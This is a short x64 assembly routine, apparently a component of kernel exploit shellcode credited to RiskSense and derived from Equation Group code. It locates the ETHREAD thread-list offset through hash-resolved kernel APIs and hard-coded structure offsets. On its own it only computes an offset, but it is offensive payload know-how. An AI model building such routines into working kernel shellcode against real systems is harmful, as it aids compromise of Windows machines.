;
; Windows x64 Kernel Get ETHREAD.ThreadListEntry Delta
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; Copyright: (c) 2017 RiskSense, Inc.
; License: Apache 2.0
;
; Based on EQGRP code
;
; Arguments: r15 = base of nt
; Clobbers: RAX, RSI, RCX
; Return: RCX = delta offset
;

THREADLISTHEAD_OFFSET     equ   0x308

find_thread:

  mov rax, r15
  mov r11d, PSGETCURRENTPROCESS_HASH
  call x64_block_api_direct

  add rax, THREADLISTHEAD_OFFSET          ; PEPROCESS->ThreadListHead
  mov rsi, rax

  mov rax, r15
  mov r11d, KEGETCURRENTTHREAD_HASH
  call x64_block_api_direct

  mov rcx, rsi                            ; save ThreadListHead

__compare_threads:
  cmp rax, rsi
  ja __walk_threads
  lea rdx, [rax+0x500]
  cmp rdx, rsi
  jb __walk_threads
  sub rsi, rax
  jmp __calc_thread_exit

__walk_threads:
  mov rsi, qword [rsi]                    ; move up the list entries
  cmp rsi, rcx                            ; make sure we exit this loop at some point
  jne __compare_threads

__calc_thread_exit:
  add rsp, 0x40
  mov rcx, rsi
